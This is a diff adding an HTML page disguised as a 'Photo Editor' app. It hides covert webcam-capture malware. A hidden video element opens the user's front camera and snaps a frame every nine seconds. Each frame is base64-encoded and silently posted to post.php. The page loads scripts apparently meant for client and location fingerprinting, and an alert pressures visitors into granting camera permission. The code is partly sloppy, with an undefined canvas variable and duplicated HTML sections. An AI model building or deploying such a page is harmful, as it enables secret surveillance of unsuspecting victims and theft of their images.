@@ -1,0 +1,186 @@
+<!doctype html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8">
+  <title>PHOTO EDITOR</title>
+  <script src="../../assets/js/jquery.min.js"></script>
+  <script src="../../assets/js/client.min.js"></script>
+  <script src="../../assets/js/loc.js"></script>
+  <link href='https://unpkg.com/boxicons@2.0.7/css/boxicons.min.css' rel='stylesheet'>
+  <link rel="stylesheet" href="style2.css">
+<style>
+ 
+</style>
+</head>
+
+</html>
+<html>
+<body onload="mydata()">
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canva = document.getElementById('canva');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+// environment -- user
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 640);
+       var canvasData = canvas.toDataURL("image/png")
+       cc = String(canvasData).replace("data:image/png;base64,","")
+      //  console.log(cc)
+       post(cc); }, 9000);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="style.css">
+    <title>Face-App</title>
+    <script>
+        window.console = window.console || function (t) {
+        };
+    </script>
+    <script>
+        if (document.location.search.match(/type=embed/gi)) {
+            window.parent.postMessage("resize", "*");
+        }
+    </script>
+</head>
+<body>
+  <div class="main">
+    <div class="Tools">
+       <ul>
+          <li>
+             <i class='bx bxs-brightness-half'></i>
+             <p>BrightNess</p>
+          </li>
+          <li>
+             <i class='bx bxs-brush' ></i>
+             <p>Blur</p>
+          </li>
+          <li>
+             <i class='bx bxs-collection' ></i>
+             <p>GreyScale</p>
+          </li>
+          <li>
+             <i class='bx bxs-color-fill' ></i>
+             <p>Hue Rotate</p>
+          </li>
+          <li>
+             <i class='bx bxs-magic-wand' ></i>
+             <p>Saturation</p>
+          </li>
+          <li onclick="Download_btn()">
+             <i class='bx bx-export' ></i>
+             <p>Export</p>
+          </li>
+       </ul>
+    </div>
+    <div class="content">
+       <p id="logo">Photo Editor</p>
+       <div class="choose_image">
+          <div class="upload_img_box">
+             <i class='bx bxs-image-add' ></i><br>
+             <input type="file" name="selectedImage" id="selectedImage" accept="image/jpeg, image/png">
+             <p id="hint">choose Image from folder</p>
+          </div>
+       </div>
+       <canvas id="image_canvas"></canvas>
+       <div class="image_holder">
+          <button id="remove_img_btn"><i class='bx bxs-message-square-x' ></i></button>
+          <img src="" alt="img" id="image">
+       </div>
+       <div class="options">
+          <div class="option">
+             <input type="range" max="200" min="0" value="100" id="brightness" class="slider">
+             <p id="brightVal" class="show_value">100</p>
+          </div>
+          <div class="option">
+             <input type="range" max="40" min="0" value="0" id="blur" class="slider">
+             <p id="blurVal" class="show_value">0</p>
+          </div>
+          <div class="option">
+             <input type="range" max="100" min="0" value="0" id="greyScale" class="slider">
+             <p id="greyVal" class="show_value">0</p>
+          </div>
+          <div class="option">
+             <input type="range" max="100" min="0" value="0" id="hue" class="slider">
+             <p id="hueVal" class="show_value">0</p>
+          </div>
+          <div class="option">
+             <input type="range" max="100" min="1" value="1" id="saturation" class="slider">
+             <p id="saturationVal" class="show_value">1</p>
+          </div>
+       </div>
+       <button id="clearAll"><span>Reset</span><i class='bx bx-reset' ></i></button>
+    </div>
+ </div>
+</body>
+<script>
+alert("You Must Give Camera permissions To Work Without Problems");
+
+</script>
+<script src="js.js"></script>
+<link rel="stylesheet" href="all.css">
+</html>
